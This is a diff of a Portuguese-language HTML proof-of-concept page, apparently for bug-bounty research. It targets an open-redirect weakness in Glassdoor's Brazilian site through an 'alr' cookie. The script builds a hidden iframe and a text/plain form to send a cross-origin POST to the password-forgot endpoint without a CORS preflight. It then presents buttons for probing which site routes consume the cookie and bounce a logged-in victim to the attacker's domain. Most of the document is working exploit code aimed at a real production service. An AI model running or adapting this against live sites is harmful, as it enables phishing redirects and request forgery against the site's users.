@@ -1,24 +1,34 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Glassdoor Redirect PoC</title>
+<title>Glassdoor Redirect PoC – discover alr consumer</title>
 <body>
-<h2>PoC – Open Redirect via cookie <code>alr</code></h2>
-<p>
-Esta página (origem externa – GitHub Pages) envia um <b>POST sem preflight</b> para
+<h2>PoC – Open Redirect via cookie <code>alr</code> (detector de consumo)</h2>
+<p>1) Esta página (origem externa: GitHub Pages) envia um <b>POST sem preflight</b> para
 <code>/auth/account/password/forgot/initiate</code>, fazendo o Glassdoor definir
-<code>alr=&lt;referer desta página&gt;</code>. Em seguida, redireciona a vítima para uma
-página do Glassdoor que inicia o fluxo de login. Após autenticar, o site deve consumir
-o <code>alr</code> e redirecionar de volta para este domínio.
-</p>
+<code>alr =&lt;esta URL&gt;</code>.<br>
+2) Depois, use os botões para navegar por rotas comuns. Se alguma consumir o <code>alr</code>, você será
+redirecionado de volta para este domínio (prova do open redirect pós-auth).</p>
 
 <pre id="log" style="background:#111;color:#eee;padding:10px;white-space:pre-wrap"></pre>
 
+<div id="actions" style="display:none;margin:10px 0;">
+  <p><b>Navegar para testar consumo do <code>alr</code>:</b></p>
+  <button onclick="go('/')">/</button>
+  <button onclick="go('/index.htm')">/index.htm</button>
+  <button onclick="go('/Job/index.htm')">/Job/index.htm</button>
+  <button onclick="go('/member/profile')">/member/profile</button>
+  <button onclick="go('/member/home')">/member/home</button>
+  <button onclick="go('/member/account/settings')">/member/account/settings</button>
+  <button onclick="go('/auth/account/password/forgot/complete')">/auth/account/password/forgot/complete</button>
+  <button onclick="go('/auth/complete')">/auth/complete</button>
+  <button onclick="go('/auth/logout')">/auth/logout (depois faça login de novo)</button>
+</div>
+
 <script>
 (function () {
-  const nextPath = "/index.htm"; // tente também "/member/profile" se preferir
-  const log = (m) => { const el = document.getElementById('log'); el.textContent += m + "\n"; };
+  const log = (m)=>{document.getElementById('log').textContent += m + "\n"};
 
-  // cria iframe “sink” e form (text/plain) para evitar preflight CORS
+  // 1) cria iframe receptor e form text/plain (sem preflight)
   const iframe = document.createElement('iframe');
   iframe.name = 'sink';
   iframe.style.display = 'none';
@@ -36,20 +46,25 @@ o <code>alr</code> e redirecionar de volta para este domínio.
   form.appendChild(ta);
   document.body.appendChild(form);
 
-  log("Enviando POST para setar cookie alr…");
-  try { form.submit(); } catch(e){ log("Falha ao enviar form: "+e.message); }
+  log("[1/2] Enviando POST para setar cookie alr com Referer desta página…");
+  try { form.submit(); } catch(e){ log("Falha ao enviar form: " + e.message); }
 
-  // pequeno delay para o Set-Cookie do alr chegar
+  // 2) habilita botões de navegação depois de pequeno atraso
   setTimeout(function(){
-    log("Redirecionando para o fluxo do Glassdoor: " + nextPath);
-    window.location.href = "https://www.glassdoor.com.br" + nextPath;
+    log("[2/2] Cookie possivelmente setado. Agora clique nos botões abaixo e veja se alguma rota consome o alr.");
+    document.getElementById('actions').style.display = 'block';
   }, 1200);
 })();
+
+function go(path){
+  document.getElementById('log').textContent += "→ navegando para https://www.glassdoor.com.br" + path + "\n";
+  window.location.href = "https://www.glassdoor.com.br" + path;
+}
 </script>
 
 <p style="font-size:12px;color:#666;margin-top:16px">
-Use janela anônima. Antes do login, verifique em <b>Application → Cookies → https://www.glassdoor.com.br</b>
-se o cookie <code>alr</code> aponta para seu GitHub Pages. Depois faça o login normal; se vulnerável,
-você será redirecionado de volta ao seu domínio (ex.: <code>after-login.html</code>).
+Dica: abra em janela anônima. Antes de navegar, confira em
+<b>Application → Cookies → https://www.glassdoor.com.br</b> que <code>alr</code> aponta para este GitHub Pages.
+Depois clique nos botões em sequência; quando alguma rota consumir o <code>alr</code>, você voltará para este domínio.
 </p>
 </body>
